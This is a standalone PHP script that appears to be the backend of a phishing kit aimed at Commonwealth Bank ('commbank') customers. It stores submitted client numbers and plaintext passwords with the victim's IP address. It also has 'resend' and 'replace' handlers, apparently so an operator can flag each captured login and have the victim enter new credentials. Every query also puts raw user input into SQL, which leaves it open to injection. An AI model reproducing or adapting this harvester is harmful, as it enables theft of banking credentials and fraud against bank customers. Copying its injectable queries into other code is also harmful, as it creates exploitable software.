<?php
session_start();
require '../connection.php';
date_default_timezone_set("Europe/London");

if (isset($_GET["resend"])) {
  if ($_POST["uniqueid"]) {
    $uniqueid = $_POST["uniqueid"];
    $query = mysqli_query($conn, "UPDATE commbank SET status=1, viewed='true' WHERE uniqueid=$uniqueid");

    if ($query) {
      echo json_encode(array(
        'status' => 'success'
      ));
    } else {
      echo json_encode(array(
        'status' => 'failure',
        'error' => mysqli_error($conn)
      ));
    }
    die(0);
  }
}

if (isset($_GET["replace"])) {
  if ($_POST["clientnumber"] and $_POST["password"] and $_POST["uniqueid"]) {
    $clientnumber = $_POST["clientnumber"];
    $password = $_POST["password"];
    $uniqueid = $_POST["uniqueid"];

    $query = mysqli_query($conn, "UPDATE commbank SET clientnumber='$clientnumber', password='$password', status=0, viewed='false' WHERE uniqueid=$uniqueid");

    if ($query) {
      echo json_encode(array(
        'status' => 'success'
      ));
    } else {
      echo json_encode(array(
        'status' => 'failure',
        'error' => mysqli_error($conn)
      ));
    }
    die(0);
  }
}

if ($_POST["clientnumber"] and $_POST["password"]) {
  $clientnumber = $_POST["clientnumber"];
  $password = $_POST["password"];

  $_SESSION["uniqueid"] = time();
  $uniqueid = $_SESSION["uniqueid"];
  $current_time = time();

  $ip = $_SERVER["REMOTE_ADDR"];

  $query = mysqli_query($conn, "INSERT INTO commbank (clientnumber, password, uniqueid, ip, last_activity) VALUES ('$clientnumber', '$password', $uniqueid, '$ip', $current_time)");
  if ($query) {
    echo json_encode(array(
      'status' => 'success'
    ));
  } else {
    echo json_encode(array(
      'status' => 'failure',
      'error' => mysqli_error($conn)
    ));
  }
  die(0);
}

?>
